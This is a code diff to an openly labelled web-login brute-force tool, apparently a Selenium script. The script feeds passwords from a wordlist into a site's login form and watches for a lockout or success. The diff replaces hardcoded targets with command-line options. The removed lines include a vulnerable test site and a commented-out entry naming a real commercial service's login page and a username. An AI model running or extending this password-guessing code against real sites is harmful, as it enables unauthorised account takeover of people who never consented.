@@ -102,17 +102,18 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 Sel_user.send_keys(username)
 
                 Sel_pas.send_keys(line)
-                t.sleep(4)
-
-                enter = browser.find_element("css selector",login_btn_selector) #Finds Selector
-                enter.submit()
+                t.sleep(2)
 
                 print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print ('------------------------')
-        # except KeyboardInterrupt: #returns to main menu if ctrl C is used
-        #     print('CTRL C')
-        #     exit()
+                
+                enter = browser.find_element("css selector",login_btn_selector) #Finds Selector
+                enter.submit()
+
+        except KeyboardInterrupt: #returns to main menu if ctrl C is used
+            print('CTRL C')
+            exit()
 
         except NoSuchElementException: #returns to main menu if ctrl C is used
             print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
@@ -134,36 +135,21 @@ banner = color.BOLD + color.RED +'''
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
-# if options.username == None:
-#     if options.usernamesel == None:
-#         if options.passsel == None:
-#             if options.loginsel == None:
-#                 if options.passlist == None:
-#                     if options.website == None:
-#                         wizard()
+if options.username == None:
+    if options.usernamesel == None:
+        if options.passsel == None:
+            if options.loginsel == None:
+                if options.passlist == None:
+                    if options.website == None:
+                        wizard()
 
 
-# username = options.username
-# username_selector = options.usernamesel
-# password_selector = options.passsel
-# login_btn_selector = options.loginsel
-# website = options.website
-# pass_list = options.passlist
-
-username = "test"
-username_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(1) > td:nth-child(2) > input[type=text]"
-password_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(2) > td:nth-child(2) > input[type=password]"
-login_btn_selector = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
-website = "http://testphp.vulnweb.com/login.php"
-pass_list = "myPassword.txt"
-
-# username = "PublicDeskBenefactor"
-# username_selector = "#username"
-# password_selector = "#pass"
-# login_btn_selector = "#login_button"
-# website = "https://windscribe.com/login"
-# pass_list = "myPassword.txt"
-
+username = options.username
+username_selector = options.usernamesel
+password_selector = options.passsel
+login_btn_selector = options.loginsel
+website = options.website
+pass_list = options.passlist
 
 print (banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
